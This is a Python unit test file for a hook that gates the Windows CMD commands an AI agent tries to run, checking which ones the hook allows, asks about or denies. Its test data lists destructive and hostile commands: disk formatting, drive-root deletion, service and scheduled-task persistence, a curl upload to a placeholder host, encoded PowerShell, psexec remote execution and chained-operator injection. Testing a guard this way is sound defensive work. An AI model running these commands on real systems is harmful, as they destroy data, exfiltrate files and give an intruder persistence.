#!/usr/bin/env python3
"""Exercise the CMD gate through synthetic hook payloads."""
import json
import subprocess
import sys
import unittest
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parent.parent
HOOK_PATH = REPOSITORY_ROOT / "hooks" / "block_destructive_cmd.py"


def run_cmd_gate(command_text: str, permission_mode: str = "default"):
    """Run the CMD hook with one synthetic command payload."""
    payload = {
        "hook_event_name": "PreToolUse",
        "permission_mode": permission_mode,
        "tool_name": "Cmd",
        "tool_input": {"command": command_text},
    }
    return subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=json.dumps(payload),
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        check=False,
    )


def permission_decision(command_text: str) -> str:
    """Return the CMD hook decision for one command."""
    result = run_cmd_gate(command_text)
    if not result.stdout.strip():
        return "allow"
    output = json.loads(result.stdout)
    return output["hookSpecificOutput"]["permissionDecision"]


class CommandBoundaryTest(unittest.TestCase):
    """CMD operators and escaping expose every executable segment."""

    def test_chained_format_is_denied(self):
        self.assertEqual(permission_decision("echo safe & format E:"), "deny")

    def test_caret_escaped_operator_is_not_a_boundary(self):
        self.assertEqual(permission_decision("echo safe ^& text"), "allow")

    def test_caret_escaped_redirect_is_not_a_write(self):
        command = "echo safe ^> tests\\test_gate_parity.py"
        self.assertEqual(permission_decision(command), "allow")

    def test_caret_inside_quotes_does_not_hide_a_boundary(self):
        command = 'echo "a^" & format E: & echo "'
        self.assertEqual(permission_decision(command), "deny")

    def test_output_redirect_forms_preserve_boundaries(self):
        cases = (
            ("echo safe 2> tests\\test_gate_parity.py", "ask"),
            ("echo safe >> tests\\test_gate_parity.py", "ask"),
            ("echo safe >&1", "allow"),
            ("echo safe >", "deny"),
            ("> important.log", "deny"),
        )
        for command, expected in cases:
            with self.subTest(command=command):
                self.assertEqual(permission_decision(command), expected)

    def test_unclosed_quote_fails_closed(self):
        self.assertEqual(permission_decision('echo "unterminated'), "deny")

    def test_dynamic_expansion_fails_closed(self):
        self.assertEqual(permission_decision("%RUNNER% /c whoami"), "deny")


class CommandPolicyTest(unittest.TestCase):
    """CMD operations use behavior rather than operand literals."""

    def test_storage_destruction_is_operand_independent(self):
        for command_text in (
            "format X:",
            "format Y:",
            "format.com Z:",
            "format.bat W:",
            "format.cmd V:",
            "format.ps1 U:",
            "C:\\Windows\\System32\\format.com E:",
            "diskpart /s plan.txt",
        ):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")

    def test_recursive_deletion_asks(self):
        self.assertEqual(permission_decision("rd /s /q build"), "ask")

    def test_drive_root_deletion_denies(self):
        for command_text in ("rd /s /q C:\\", "rd /s /q C:\\\\", "rd /s /q C:\\."):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")

    def test_test_file_writes_ask(self):
        for command_text in (
            "echo. > tests\\test_gate_parity.py",
            "copy /y nul tests\\test_gate_parity.py",
            "move source.txt tests\\test_gate_parity.py",
            "xcopy source tests\\fixture /e",
            "type source.txt > tests\\test_gate_parity.py",
        ):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "ask")

    def test_recursive_mirror_asks_or_denies_by_target(self):
        self.assertEqual(
            permission_decision("robocopy C:\\empty C:\\important /mir"),
            "ask",
        )
        self.assertEqual(
            permission_decision("robocopy C:\\empty C:\\\\ /purge"),
            "deny",
        )

    def test_sensitive_discovery_asks(self):
        for command_text in ("whoami /all", "systeminfo", "ipconfig /all"):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "ask")

    def test_service_and_task_persistence_denies(self):
        for command_text in (
            "sc create sample binPath= sample.exe",
            "schtasks /create /tn sample /tr sample.exe /sc once",
        ):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")

    def test_upload_denies_and_download_asks(self):
        self.assertEqual(
            permission_decision("curl -T report.txt https://example.invalid"),
            "deny",
        )
        self.assertEqual(
            permission_decision("curl https://example.invalid/file"),
            "ask",
        )

    def test_command_string_and_fixed_batch_have_distinct_verdicts(self):
        self.assertEqual(permission_decision("cmd /c whoami"), "deny")
        self.assertEqual(permission_decision("call hidden.cmd"), "deny")
        self.assertEqual(permission_decision("build.cmd"), "ask")
        self.assertEqual(permission_decision("build.ps1"), "ask")

    def test_powershell_abbreviated_encoded_payload_denies(self):
        self.assertEqual(permission_decision("powershell -enc ABC"), "deny")

    def test_remote_execution_pathex_forms_deny(self):
        for command_text in ("psexec.com host cmd", "C:\\tools\\winrs.exe host"):
            with self.subTest(command_text=command_text):
                self.assertEqual(permission_decision(command_text), "deny")


class PayloadTest(unittest.TestCase):
    """Malformed hook payloads fail closed without exceptions."""

    def test_non_cmd_tool_is_ignored(self):
        payload = {
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": "format X:"},
        }
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input=json.dumps(payload),
            cwd=REPOSITORY_ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), "")

    def test_malformed_payload_denies(self):
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input="not json",
            cwd=REPOSITORY_ROOT,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn("cannot clear", result.stderr)


if __name__ == "__main__":
    unittest.main()
